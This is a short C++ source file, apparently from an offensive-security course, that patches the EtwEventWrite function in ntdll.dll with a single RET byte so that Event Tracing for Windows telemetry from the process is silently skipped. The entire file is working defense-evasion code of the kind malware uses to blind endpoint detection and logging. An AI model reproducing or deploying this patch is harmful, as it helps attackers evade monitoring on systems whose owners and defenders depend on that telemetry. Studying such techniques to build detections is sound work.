// Filename: etw_bypass.cpp
// Purpose: Patch EtwEventWrite to bypass telemetry
// Instructor: Joas A Santos - https://linkedin.com/in/joas-antonio-dos-santos - https://github.com/CyberSecurityUP

#include <windows.h>
#include <iostream>

typedef ULONG(WINAPI* EtwEventWrite_t)(void*, void*, void*, void*);
EtwEventWrite_t OriginalEtw = nullptr;

void PatchETW() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    void* addr = GetProcAddress(ntdll, "EtwEventWrite");

    DWORD oldProtect;
    VirtualProtect(addr, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
    memset(addr, 0xC3, 1);  // RET instruction
    VirtualProtect(addr, 1, oldProtect, &oldProtect);

    std::cout << "[+] Patched EtwEventWrite()\n";
}

int main() {
    PatchETW();
    // Now any telemetry attempt using EtwEventWrite will be silently skipped
    return 0;
}
